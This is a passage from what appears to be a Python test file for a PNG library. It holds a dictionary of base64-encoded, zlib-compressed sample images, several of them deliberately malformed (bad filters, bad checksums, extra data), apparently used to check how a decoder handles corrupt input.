n\nbWJ2HSt+LarxYofk97KgRHmUf7qCPoMm66L26aABcydeyPTQNo3NAkQAyvVlSudVDUltMAc0ejZK\nTZarqw4KtSXy7R6jyRPHaRI0k2diAgU5UvF/adTPS2YZz5vL4+jG7AxGjINEVMv8O5CqaXt8hnlQ\nIj0p2mF0hMb4ZVvuxqPTVdcLwbjfKe9fdEhpuKrzenyjq4fQdLuo2XHkh0OS4uR69ElbmM4TaVv9\nphIP52dWoiD1cuj+ZYcSMGfB59DG4LE5jkSt9VPn0H++6U5D00ZOTZ5DY16FOf7/IXevv2JiLxpc\nGjl+kxSKgH/YTVsxFcFf7/8bUd5AUg==\n'.decode("base64").decode("zlib"),
        'gamma_four_nosrgb': 'eJztV2tQE1cYTeurasEKVTq0QkVipxbBtk6pYohgrMSAMCADqRCKhFq1Q0BiEhJCWml5aCtDkIii\npGLxURUkCDS8Uod0IqJRQV5CEhUkQUm2BJLNg812EzLS+KPtD3/4yszm3t2753zn++65e+fmR2zZ\n5DTPfR4KhXLCh+AikRayXm+8jvwbYobPIc3MHUFhQajZ7t91YJJnIvdzU0OI6SiUc6v1ek1COUNG\nHi6mboylRlG+ptIT9ySjUhN3plB9U5Kp76/2XRWg0u1EoRYuwuOCtjJI6t7wMxV0tmRsmSzvplde\nxA83O342UKIO8SK/rIlI2utaThT/cuJSxYX4S+RIXERRjq/7Rrdap65DW0PcqoPcaj9Te+0cOcTb\n7H8hh7ywPNvr6Hr8+p8imMyijOXpgJkODEkNDY1Abs/9Y8prD7VZZcbjNY2WUxiw1J8BTu4HK+qZ\nsG42kIsdVCewZpN0SyhgwY7EBgnXp5Ccv5zgTdyO55Voqr2RXnmbC54Xy0WfYvm0kfpcF4wm3Blf\nMNF52HHEI63dYpxv/sC3mb3UtIHCx6yBvAmriV5tLgSBmFqA7lt2kMZ5ywSmrBnrbOX63CLnexN8\n2lw6MTxywedx+rRiz4G5irXMB+WOqAPO+6RlWKyML+X6fCxLwuvz1ijjstHE7YjU0YWb2kminkBW\nj37tE4yxZapcjmTdh6YZeN43AhwXzSPnj3gQBKf3aOcqnwgRZeo2qs9yhsQcPBd91Jr/FP2/V8LF\nkRj3PEFlpRzWDZkhCDhY2iRi1INXqphu8odqhaEErFmQUQWdrFmFlJoXIsAVobk+CFMoiJA4ljjf\noYjWXhgCEE/N0ivo04VqTmNblFlGGlCnGLMYNsizARbPfCPB7K8R1sPoek6/Wl4qZy+2T7ONddoh\nNtZph1hZpx1iEzTtkFfQpwfthcR8jbAHzgfl4QwRR/M62Kdgl5hz+wOvY4wWxV09YEQDphj+j8+g\n9pcYSmucAw7s1sBYjVugea9mBphZ2Dj+pv6PJYDSArVS7pcJ1YsGLMMyIoJbGd1gh45EH3G8JTZw\nGPDtrH5hJnWXTQgXXbc1XN6s5PdZWszQp0pAVklKs490PKo1X2H3e7Jh1eX+wTJwzgi2UbTUreoL\nq2ZE6couV33wxOEkWDt4moCdykxcSKvqDnqkaAZ66zsxdRXMSedg7B3jZXbq/r+KptKLq9S7h4KS\nzQIx72F1wCltdsC9MT9KVXicnba9i5T9ERVW0VTCpvROqCCRoOsNA2OAPbUx9wZ42nvsBzkZcgry\nfULIh4+ldzl3ZeqQ9rw34duzZReNJFatbwzLqbLcnK2qh98Zpl/bjbypJYXAHSRL3vh97rSK9zSW\nu7q6oizJZLXtI4isjsgK+5xUR58LA3t5K+LtqiZ+C33Rb0dpBZMFYDHnQZbmAF8pz4A9Uz0tNfQ0\nvnFo74BCLhz0gDcAHA4Qat8WbHX8NSb5sXERkzWvsG8S0/6z9xF3VF217zY2gzGjp9cDYrZzn9j3\nHhs1qfjx6rBLfRXSIWSfusUSDWAD/4SGToqk0KQC8qKPKybfBm+J7qSBsBD042tbWD1HSl6Kajzb\nIQX9bDhJHuWfoWDMoMt6aAM6eAjqjmlmeWhbJmYBIgDj+jyl86KGpDVCAU2eTVKz5fLK/c3aUvk2\nj/GUyaN0CZbFN7OAwlyp+L806uelsE1noYp4hiknkxnrIBHTNv8WrGrZlpAJDUukx0XbTY7QWL8c\ny+0EbIbqahEY/zv13fMOKY1Wd19NaHL1aDbfLG51HPn+gKQkpQF73B6m+1j6Fr+pxMMFWVUYWL0M\nvnvRoQSsWcg5tCl4Yo4jUXvD1Dn0n2+607H0sRPWc2jsizDH/z/krnWXzJxFw0siDdfJoSjkh9+4\nBVcZ/NW+vwFOcjyC\n'.decode("base64").decode("zlib"),
        'grayscale_with_plte': 'eJzt0ltM01ccB/Df5sIqUGEOhzKcxgyhAnMhIBUQRrmWO6Xixt1FNxhLHLalimupMqdcJg8UGxGG\nxDbIpTQLlzFrWxf+UyYzIxYJsJXaZgx6ASwpjhXKb+VtW9LXPe2T8/2ek5ynX86pzcpIIrv6uAIA\nmZ4cz3Ds9q2QHAWMonf2A2yDrDRmwm4+BpViFAtjczC7CNOq8XQycnKwpAw/Y+tDBqlk1Yd7xwCe\nUsAIpGcAqz7BkwDaHMAEMPKCJtm5PTs+GoKqW5DYXlHenBR7H7LHoGASON/Dge6b25rw9fZNGPgB\nuhCUyzCM4cIJ/1qERw0wMRSkac2v607uQrZjDWOBSSvmHMdAOoaxpiphtDwQYz0xFzA1wlzy0san\noDl+CnPZddHYF4rKGBR+MvxdybXLxXiDjl1MC+66hHAX9/c+oeA0BdF17o99iLsQD03qKKgPxZX3\n2vBc6+OUh0/y0JCHjfV7269DXS+0fAv9AujrAGUv1EyCRAMjDaAWwfxFwIFk4jfQm5IFAoHIEYFM\ntnUiRIS5ZgVViIRIMCUTTIvRchHXxEigykyI9H+24nwrOhpVBGqncIpAnEKz1uJo1CLqCFwj0Gx2\nxHGjXdMj6tGCW+B//6HpmgYLwMtt9PhY5rmZRc03qW9mw8MKvF9JIbNLO2e6hNffCPqibnxnQLMX\nxSvy/QjSAc5oFpG+4n+VevQV71crAq6yR1d8brvIN1woRVaecuQ1km6Jxb3HfU4KV2/nxBXHxdDK\nO2bD8sk8+uNxdbhYGyxxPzRxpm3DV4cNR0ZiJTbdi7lO11XvJV3iadvJo6Y7DEVkdYhxkRlh/Orj\ne6mfp9uqf6ZJbYM1jCHT0xMb4tTMv6muXzV1vJ2myt/hV3zla2c2rxnUbzVFS6l8D55b8JczlCpn\nbHXWssssitDLQPWmHWZYncrpzryw4WvbbfNs8VCQFdv9nvV48RZtEjWDrxlWFqcYwiXLzWfZ5xdF\nfNns2uDyvsrf5f52F6tCUZ/Osi1ZHpXKQxaYXTFcroc83dj44HD3L91JqigXEYerzJb9uOfM7do9\ny+58zoMeW9m/BtvMNalT5uTjBQGLz88vfFB6RGg1UOcXDM50MjFa6JUZl0lrpDXGGX4aVzujDePZ\nQqS+0SSN2zF3SX9ipjPFTdH2yHel1FkPP14gu9A+5nnMHmoMT6Uo8lZvrvdLX1TIMnjrJScH7AOR\n+ZLNXzWzFwpvKHlRfLqG31bF3Tw1kd/LmohstxxcM1pPLK/7rErbzt7Nkin1/oX/fA8Uo1vOQXlY\nS9WtqK0PS0/IiO+jlVz6C/GNeLE=\n'.decode("base64").decode("zlib"),
        'idat_bad_filter': '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\nnfwTRBAEUw==\n'.decode("base64").decode("zlib"),
        'idat_bad_zlib_checkbits': 'eJztV31UUmccprVq1bSlK3dc6TJpZ820bZ25MiSNloSmR/MoS2EmrVU7okmgIHKWmx+15RGTLEuW\nzT5WSWLqUJF1ZIfMog/zKwUqTbCEO1G4fN9dkROjP7b90R99cc7lve997/P8nt/vfd77nrcoZvNG\ntznecxAIhBs2AhMLt9bJ66034H9DwvA5uJmWGbsxHFEjXTQCd97cERYVhkDUFs+1pMyA+7PTI/CZ\nCIR72+Q1TUI+Q4IfLqRsSKTEkb+h0FL2bEekp+xMowSmbad8sCpwZYhKtxOBmL8AiwnbkkVU90af\nqaYxJWNLZYU3/Qpjfrh5+2cDOe4QJ/arupjUvZ5VePEvJy5VX0i+RIrFxJTmB3pv8Kp36zq0JcKr\nNsyr/nO1386RQ5xNwRfySfOr8vyOrsOu+ymGTi/NXpYJmGnAkNTQ1AwU9Dw4prz2SJtbaTxe12w7\nhQIrgrNAy36wupEO6WYCBehBNZExk6BbTAaLd6Q0SdgBJaSiZTh//DYsp1xT6w/fVbV7YDmJbOQp\nRkA7oc9z3ijx7vi8ic7DriM+GR0241zzh4FC5hLTejIXtdrqj1uF92v3wPHFlGJk39KDVNY7JjBt\n9VhnGzvgFqnIHxfQ7tGJ4pCKv0jSZ5T5DsxWrKE/rHJFHXDfJ61Eo2VcKTvgE1kqVl+4WpmUh8Rv\ng6WOzt/YQRD1hDJ69GueYkysVBWwJGs/Mk3Hcr7lY9hIDqloxAfHP71HO1v5VIg4U7dRfZY1JGZh\n2cijk/lP0f97JTxciTEvElRWwWLckBnCgIMVLaKsRvAKj+4lf6RWGMrBunnZPOvJupVwqTkRfEwp\nkh0AM0WCMIlriYtcijh5FwUDxFOz9Br6bKGa0+hWZa6RCjQoxmyG9fI8gMEx3yCagzWCRgjZyOpX\nyyvkzIWOabazOh1iZ3U6ZJLV6RC7IKdDXkOfHbTXKuZqBD1QESiPzhKxNG+AfQpmubmgP/Q6ymhT\n3NMDRiRgSuD++Bxqf4Wh1OZZ4MBuDYTWeIWa92qmgzklzeNv6/9YDCht1jbyg0qBesGAbViGh3Er\n4psc0JH4I65dfBMrC7qT2y/IoeyyC2EjG7ZEy4VKbp+t1Wz9TAnIaggZjpHbj+vNV5j9vkxIdbl/\nsBKcNYJuFi3x4n05qRlWuqLLUx8+cTgV0g6exqGnMhOXUHndYY8VQqC3sRPVUE23uIej7xovM9P3\n/1U6lV5Sjd47EpRs4os5j2pDTmnzQu6PBZF50UkO2o4uQt7HFEhFVQlaMjutxSk4XW8UmADsqU+4\nP8DR3mc+zM+Wk+HvE0w+fCyzy70rRwe35/1x352tvGgkMOoDExhuNVXmPFUj9N4w7dpu+E0tIQK6\nTbAVjj9gO1Us0tju6RpKcyWWWvtHEF4dsdWOOamNPxcF9nKWJztUTfwW+bJ3R6nFlmKwjPUwV3OA\nq5RnQ77pvrY6WgbXOLR3QCEXDPpA6wEWC4h0bAv2Ov6asP2JcWGTCZc7Ngmn/xz3sDt4Vx27jd1g\n9HjneoDNdu5Tx95jpyaUPVkdDqmvQ7qE7FO32uIBdOif1qGTIqnVorD60cYVlnfBW6K7GSAkAIO4\n2lZGz5HyV6Iaz3dIfj8TSpXHBWcrsqbTZD3UAR00ZO1OEDJ8tK0TMwARgPJ8kdJ5WUNSm60hLb4t\nUrPt8or9Qm2FfKvPeJrlKE2CZnDNDKCkQCr+L436OWlM01lrdXKWKT+HnugiEdU+9xakat1KzLEO\nS6THRdtMrtDEoHzbHSI6W3W1FEz+nfL+eZeURmu7rxJbPH2E5ptlba4j3x+QlKc1oY87wnQfy9wc\nNJV4ND+Xh4LUS6F7F11KwJgBn0NbwidmuRJ1NE2dQ//5pjcNTRs7MXkOTXwZ5vj/h9y19pKZtWB4\ncazhOikSAf+wGzZjasK/3vc3hZFA6A==\n'.decode("base64").decode("zlib"),
        'idat_bad_zlib_checksum': 'eJztV31UUmccZnWqVdOWrtxxS5dJO2umbevMlSFptCQsPZoHWYozaVu1I5oECCJnuflRWx4xybJk\nWfadJKYOFVlHdshs9GF+pUClCZZwJwpXPu8uyInRH9v+6I++OOfyvve+93l+z+/3Pu99z1sUu3mD\nxxzfOQgEwgMbhYmDW6v9enMa/D+JHz4PN7MzoghZCIRnm/16Q0o+Q4IfLqSsT6TEk7+h0FJ3b0dk\npO5IpwSnb6d8sDJ4RZhavwOBmL8Ai4nYQidqemPOVNNY0rEl8sKbAYWxP968/cskOf4gN+6ruti0\nPd5VBMmvxy9XX0y+TIrDxJbmB/uu96n36Dq4JcqnNsKn/nNNwI6Rg9yNoRfzSfOr8gKOrMWu/TmW\nwSjNXpoFmGnAkGyyqRko6HlwVHX9kS630nisrtl2CgVWhNJByz6wupEB6WcCBehBTQpzJlG/iAwW\nf5vaJOUElZCKluICCduw3HJtbSDcq2r3wnITOchTzKB2Yp/3vNGUu+PzJjoPuY/4ZXbYjHPNHwaL\nWItN68g81CprIG4lIaDdCyeQUIqRfUsOUNlvm8D0VWOdbZygW6SiQFxQu1cniksq/iLJkFnmPzBb\nuZrxsModtd9zr6wSjZbzZJygT+RpWEPhKlVSHpKwDZY6On9DB1HcE87sMax+ijGxUl3Alq75yDQd\ny/1OgOEguaSiET+c4PRu3WzVUyHiTd1GzVn2kISN5SCP2POfov/3Sni5E2NeJKi8gs28IZ+MAA5U\ntIjpjeBVPsNH8UijnCwH6+Zl860n6lbApeZGCTClSE4QzBQNwiTuJS5yK6K9twkGSKZm6TX02UK1\np9GtqlwjFWhQjtkm1ynyACbXfCPFHKoVNkLIRna/RlGhYC10TrOD1eUQB6vLIXZWl0McglwOeQ19\ndtBeq4SnFfZARaAihi5ma6eBfUpWubmgP/xPlNGmvGcAjEjAhOf99Bxqf4Wh1OZZ4MAuLYTW+oSb\n92ingzklzeNvGX5fBKhs1jbyg0qhZsGAbVhOgHHLE5qc0JGEw+63hCY2HbqT2y/Moex0COEgG7bE\nKEQqXp+t1Wz9TAXIa4iZzpHbj+vNV1n9/ixIfaV/sBKcNYJuFi/24X9p1wwrXd7lbYicOJQG6QZP\n49BTmUlKqPzuiMdKEdDb2IlqqGZYPCPRd41XWBn7/iqdSi+pxuAbDUo3CiTcR7Vhp3R5YffHQsj8\nmCQnbUcXMe9jCqSmqoUtWZ3W4lScvncTiAd21+PvD3B191kP87MVZPj7BJMPH83q8uzK0cPthUDc\n92crLxmJzPpgPNOjpsqcp26E3h2mXd8Fv6kjRkG3ibbC8Qccl4r3tbZ7+obSXKml1vERhFdHXLVz\nTmoTzm8Ce7nLkp2qJs5Fv+y3o9RiSzFYxn6Yq93PUymyIf8Mf1sdLZNnHNozoFQIB/2gdQCbDUQ7\ntwVHHU/itz8xLmwy0TLnJuHyn7MPu4N/zbnbOAzGSHCtB9hs5z917j0OamLZk9XhlPo6pFvIPk2r\nLQFAh/9hHTohllktSmsAbVxpeQe8Jb6bCUJCMISna2X2HC5/JarxfIcU9LOgNEV8aLaSPp0m76EO\n6KEhazdexPTTtU7MAMQAyvtFSudlDUlttoa1+LfIzLYry/eJdBWKrX7j6ZYjNCmayTMzgZICmeS/\nNBrmpLNMZ63VyXRTfg4j0U0iqn3uLUjdujUlxzoslR0TbzO5QxND8m13UtDZ6mulYPJvlPcuuKU0\nWtt9LaXF209kvlnW5j7yw35peXoT+pgzTPfRrM0hU4nHCHL5KEizBLp3ya0EzBnwObQlcmKWO1FH\n09Q59J9v+tLQtLHj9nNo4sswx/8/5M41l83sBQhE3DnZyUgE/MOu34ypifx679/mtTgW\n'.decode("base64").decode("zlib"),
        'idat_bad_zlib_method': 'eJztV2tQE1cYjVq1asEKVTpUoSKxU4tgW6dUMUQwVmJAGJAJqRCKYK3aISAxgYSQqbQ8tJUhSERR\nUrH4qEpMECgQSB3SiYiND+QlJFFBEpRkSyBZ8thsl5AxjT/a/vCHr8xs7t69e853vu+eu3duYdSW\nTS5zPeeiUCgXfBguGmmhyevN6cj/BHHoPNJMy4jeFIqqli0eRjpv7AyJCEGhBEXzLEkzkf6ctDBS\nBgrl2jp5TZNSzqYgDxdRN8ZRYyhfU+lJe3eg0pJ2pVL9U3dQ31/tvypIrd+FQi1YiMeFbE0ja3oi\nz1bRWdLRZfKCmz4FUd/fvP3TBCXmMDf6y5qo5H3ulSTJzycvV11MuJwSjYsqyfP33OhR69J5eGuY\nhyDEo/Yzjc+u4cPczYEX81IWVOb6HFuPX/9jFINRkrU8AzDTgUHZRGMTkN/94Ljq+iNdToXxRE2T\n9TQGLA/MBC0HwKp6BqyfBeRjBzSJzFlk/RIKWLQzqVHK8StOKVxO8CVtx3PLtAJf5K6yzQ3PjeOg\nTzP92si97vNHEu+OzR/vOOI84pXebjXOM3/g38xaatpA4WHWQL6E1SSfNjeCUEItQvcuO0Rjv20C\nU9eMdrRy/G6lFPoS/NrcOjDclKLP4w3ppd79c5RrGQ8rnVEHXffLKrBYOU/G8ftYnow3FKxRxeei\nSdsRqSMLNrWTxd3BzG7D2qcY4yrU+Wzpug9NM/Dcb4Q4DpqbUjjsRRCe2aubo3oqRIypy6g5xx6U\nsPEc9LHJ/Kfo/70Sbs7EuBcJKi9nM2/IJ0KAQ+UicWY9eJXP8FA80ignysCa+Vl86FTNKqTU3DAh\nrgTN8UOYwkGExLnEhU5FnLyLQACSqVl6DX22UO0ZbIsqx0gD6pSj1okNilyAyTXfSDQHahvqYXQ9\nu0+jKFewFtmn2cbqcIiN1eGQSVaHQ2yCHA55DX120B5IwtM2dMOFoCIyU8zWTgd7lawyc35f8J8Y\no1V5zwAY0YCJyPvhOdT+CkNpTbPB/j1aGKv1CDbv084As4ubxt4y/L4EUFmhVsqDigbNwn7rkJyE\n4FbGNtqhw7FHnbukRnYmfCenryGbutsmhIOu2xqpaFbxeq0tZuhTFSCvJqfbR24/rjVfZfV5s2D1\nlb6BCnD2MLZJvNSD/8WkZkTpyk53Q+j4kWRYN3CGgJ3KTFJM43eFPFY2Az31HZi6KobFNRR713iF\nlXbgr5Kp9OKrDZ7hoHSzUMJ9JAg6rcsNuj8aQOFHxttp2zvJuR9RYTVN3SDK6ICKkgj6ngiQCOyt\nJd7v5+rusx7mZSkoyPcJIR86ntHp2pmtR9oLvoRvz1VcMpKZtf5Epkt1pTlXXQ+/O0S/vgd5U0cO\ng2+TrQVjDzgOFYu11nv6upIcqUVg+wgiqyO6yj4ngtjzEWAPd0WCXdX4r+Eve3eEVmQpAkvZD3O0\nB3kqRRbsneZtraGn84yD+/qVioYBL3gDwGYD4fZtwVbHX4g7nhgXMVnzCvsm4fCf/R5xB/+afbex\nGYwR61gPiNnOf2Lfe2zU5NInq8Mu9XVIp5C9mhZrLIAN/gMaPCWWQRYl5EMfU1reAW+J76aDcAMY\nwNO1MLuPlr0S1Xi+Qwr7WHCyIiYwS5k5gy7vpvXr4UGoi9jM9NK1jM8ExADG/UVK52UNSWuCgkTe\nIpnZemXlgWZduWKb11iq5RhdimXyzEygOF8m+S+NhrmpLNM5qCoh05SXzYhzkohpm3cLVrdsS8yG\nhqSyE+LtJmdoXECe9U4iNkt9rQRM+I363gWnlEYEXdcSRe5ezeabpa3OI98dlJalNmJP2MN0Hc/Y\nEjCVeKQwh4+BNcvge5ecSsCciZxDRaHjs52J2hunzqH/fNOTjqWPnpw8h8a9DHP8/0PuXnfZzF44\ntCRaJAinopAffuMWXHXoV/v/BuaKQJc=\n'.decode("base64").decode("zlib"),
        'idat_empty_zlib_object': 'eJzrDPBz5+WS4mJgYOD19HAJAtJ/QZiDCUj+CH+2GkgxFge5OzGsOyfzEshhSXf0dWRg2NjP/SeR\nFcjnLPCILGZg4DsMwozH81ekAAXFSlwjSoLz00rKE4tSGQoSM/NK9PJSSxRM9AysX3zNBKrg9nRx\nDKm4xcjA8P8/yAo99VsPgTSDp6ufyzqnhCYAp3UqFg==\n'.decode("base64").decode("zlib"),
        'idat_junk_after_lz': 'eJztV2tQE1cYzeioVYtWqNKhCi0SO7UItnVKFUMEYyUGheExCRVCEWyrdohITEJCyFRaHtrKECSi\nKKlYtFYlEgQaIKSO6UTERgF5CUlUIglKsiWQLHlstkvImMYfbX/4w9fO7N67c/ec73zfPXfv3KKY\nbZs95vnMQ6FQHvhIXCzSQlP3azOQ5yRx+DzSLKFuIlHjKF9S6an7dqL2pu7KoAZl7KS+syZodajW\nuAuFWrQUjwuPZ5B1fdG/VNPZsrHlisJb/oUx393q/HGSEneEF/t5XUzafq+qROlPpy5XX0y+nB6L\niynND/LZ5F3v0X0kPtK7Nty7/hOd/66RI7wtIRfz0xdV5fkf34Df8EMMk1mavSILsNIBtXyyqRko\n6L1/QnPjoSG30nyyrtl+BgNWhDBA20GwupEJG2cDBdghXQprNtm4jAIWf5XaJOMGlqQXrSAEJO7A\n88r1tQFIr6rNE88jcdFnWIFt5H6vhaMpd8YXTnQddR/xzWy3m+db3wsSs9+1bKTwMWuhAMKaRP82\nT4JQSi1G9y8/TOO8YQEz1o51XeUGdqQXBRAC2zy7MLz04k+TTJllfoNzVeuYD6rcUYcWHJBXYrEK\nvpwb+KEiDW8qXKtJykMn7kCkji7a3E6W9Iaxek3rnmAkVWoLOLL171tm4nlfC3FcNC+9aMSXIDy7\nzzBX80SIOEuPWXeOo5Zy8Fz08an8p+n/vRKe7sS45wmqqOCwbiomw4HDFS0SRiN4TcD0Vj7UqSbL\nwbqF2QLodN1qpNS8SCGuFM0NRJiiQITEvcRFbkWc6m1FANLpWXoFfbpQ/VlsqybXTAMaVGP2yY3K\nPIDFs95MsYboRY0wupEzoFNWKNlLnNPsYHU5xMHqcsgUq8shDkEuh7yCPj1oHyTl60W9cBGojGZI\nOPoZYL+KXW4tGAj7E2O2q+6aADMasBD53z+D2l9iKK15Dji4Rw9j9d5h1v36mWBOSfP466bflwEa\nO3SVcr9SpFs8aB9WJCK4VQlNTuhIwjH318QmDgO+nTsgyqHudgjhohvio5ViDb/f3mqFPtYAihpy\npnOk81G99Rp7wI8Na68MDFWCc0awzZJ3vQWfTWlGlK7q9jJFTBxNgw1DZwnY6cykJTRBT/gjlRjo\na+zCNFQzbQsisHfMV9h7D/5VOp1eUo3JJwqUbRFKeQ9rQ88Y8kLvjQVTBNFJTtr2bnLeB1RYS9OK\nWrK6oOJUgrFvK0gE9tUT7w3yDPfYD/KzlRTk/4SQD5/I6l7QnWNE2gsBhG/OVV4yk1n1QUSWR02V\nNU/bCL81TL+xB/nSQI6EO8n2wvH7XJeKpXr7XWNDaa7MVuv4CSKrI7baOSe1Cee3gn28lclOVRO/\nRr3or6O0YlsxWMZ5kKs/xNcos2G/vX72Onom36zeP6hSioZ84Y0AhwNEObcFRx1/Ju58bFzEZOKV\nzk3C5T9nH3GH4Lpzt3EYjJngWg+I2c5/5Nx7HNTksserwyn1VUi3kP26VnsCgA37A1Kflsghmwry\np4+rbG+CHZI7mSAsAoP5hlZW77Hyl6Iaz3ZI4QAbTlPGhWSrGDPpil7aoBFWQz1EMcvX0DoxC5AA\nGK/nKZ0XNSStGQpt8WuRW+1XVh0UGyqU233HM2zH6TIsi29lASUFcul/aTTNy2BbzkHVyQxLfg6T\n5CYR0za/A9a2bk/JgYZl8pOSHRZ3KCk43347BZutvV4KJv9GffuCW0qjtT3XU1q8fMXWW2VX3Ue+\nPSQrz2jCnnSG6TmRtS14OvFoYa4AA+uWw3cvuZWANQs5h7ZETMxxJ2pvmj6H/vNLHzqWPnZq6hxK\nehHm+P+H3L3+spWzeHhZbIe6u7ND3RlFKotHIRd+0zZcTcQXB/4GC7c4wA==\n'.decode("base64").decode("zlib"),
        'idat_too_much_data': 'eJztV2tQE1cYzeioVYtWqNKhFSoSO7UItnVKFUMEYyUGhQEZoEIoEtuqHQISk5AQMpWWh7YyBIko\nSioWrVWJBIEGCKljOhHR+EBeQhIUJEFJtgSSJY/NdgkZ0/WH7Q9/+NqZ3Xt37p7zne+75+6dWxi1\nZaPbHK85GAzGjRhOiEZaCLmvvDENeZ7rT69DmkW0DfG0GOrXNEbKnh2Y9JSdabSAtB2091cFrAzW\nGndiMAsWEgmhW5lkXXfkb1UMjnx0qbLgpm9B1A83b/88QY05xI/+sjYqda9HZYLslxMXq84nXaRE\nE6JK8gK8NnjWuXUc2hruWRPqWfeZznfn8CH+pqDzeZQFlbm+R9cR1/0UxWKVZC3LBKwMYFAx0dgE\n5HfdP6a59tCQU2E+XttkP4UDy4OYoG0/WNXAgo0zgXz8gC6ZPZNsXEwFi75JaZTz/IsphctIfgnb\nifwyfY0f0qtsdSfy43nYU2z/VnKPx/yR5Ltj88fbD6NHvDPa7Oa51g8CJJwllvVUAW415EdaleDb\n6k4SyWhF2J6lB+nctyxg2urR9ss8/1uUQj+Sf6t7O45PKfo80ZRR6tM3W72G9aASjTowb5+iAo9X\nChQ8/4+VqURTwWpNYi42YTsidWTBxjaytCuE3WVa8wRjfIU2nytf+6FlOpH/rYjAw/IphcPeJNHp\nPYbZmidCxFg6zboz3EEZl8jDHp3Mf4r+6ZVwRxMTXiSospzLvqGcCAUOljdLmQ3gFSHLU/VQp54o\nA2vnZwmhk7UrkVLzw0WEEizPH2GKABESdIkLUUWc7G1GALKpWXoNfbZQ/Wl8iybHTAfq1aP2ifWq\nXIDNt95ItgbpxQ0wtoHbq1OVqziLnNPsYHU5xMHqcsgkq8shDkEuh7yGPjtoNyQT6MVdcCGoimRK\nufppYI+aU2bN7w25jjPb1f0mwIwFLHGCH59D7a8wlN40C+zbrYfxes8Q6179dDC7uGnsTdOfiwGN\nHbpMvV8h1i3ssw8pExDcithGJ3Q49gj6NaGRy4Tv5PSKs2m7HEJ42PqtkSqJRtBjb7FCn2oAZTU5\nwzly+1Gd9Qqn14cDay/1DlSAs4bxTdIlnsIvJjUjSld0eJjCxg+nwoaB0yT8VGayYrqwM/SRWgJ0\nN7Tj6qtYtnlh+LvmS5z0/X+XTKWXWG3yigDlm0Qy/sOa4FOG3OB7o4FUYWSik7atg5z7EQ3W0rXi\n5sx2qCiFZOzeDMYBe+ri7vXxDfc4D/KyVFTk/4SQDx3L7JjXkW1E2nN+pO/OVFwwk9l1AXFst+pK\na662AX5niHFtN/KlgRwO3ybbC8bu81wq3tPb+431JTlyW43jJ4isjugq55zUxJ7dDHbzlyc5VY3/\nHvGyv47Qi2xFYCn3QY7+gECjyoJ90n3stYwMgXlwb59aJR7whtcDXC4Q4dwWHHX8NW7HY+MiJpMs\nd24SLv85+4g7hFedu43DYKxY13pAzHb2E+fe46Amlz5eHU6pr0OiQvboWuyxAD7kL2jwpFQB2dSQ\nL